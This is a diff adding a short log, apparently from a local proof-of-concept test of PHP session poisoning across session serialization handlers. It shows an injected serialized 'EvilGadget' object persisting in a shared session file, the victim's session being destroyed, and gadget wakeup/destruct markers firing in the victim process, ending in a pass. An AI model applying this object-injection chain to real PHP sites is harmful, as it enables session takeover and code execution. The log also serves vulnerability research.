@@ -1,0 +1,19 @@
+[1] victim login: VICTIM-LOGIN-OK uid=1337 role=user
+[1] session file: 27 bytes | head: b'uid|i:1337;role|s:4:"user";'
+[2] touch #1 (php_binary reader vs php victim file): HTTP/1.1 200 OK
+[2] session file after crossfire delete: MISSING
+[3] touch #2 (inject; php_binary writer, cleanup=0): HTTP/1.1 200 OK
+[3] shared session file now (php_binary format, poisoned key persisted):
+    407 bytes | head: b'Gupload_progress_x|O:10:"EvilGadget":1:{s:3:"cmd";s:13:"pwn-xhfire-a1";}a:5:{s:10:"start_time";i'
+[4] VICTIM's own read (php handler):
+    | <br />
+    | <b>Warning</b>:  session_start(): Failed to decode session object. Session has been destroyed in <b>/mnt/c/Users/andre/Downloads/php2shell-claude/wp2/shape10/docroot_victim/victim.php</b> on line <b>36</b><br />
+    | VICTIM-READ-START
+    | SESSION-COUNT: 0
+    | AUTH: uid=NULL role=NULL
+    | VICTIM-READ-END
+[4] gadget markers (fired INSIDE the victim process):
+    | WAKEUP: wakeup fired in cli-server cmd=pwn-xhfire-a1
+    | DESTRUCT: destruct fired in cli-server cmd=pwn-xhfire-a1
+[5] ASAN hits: none
+[PASS] a1
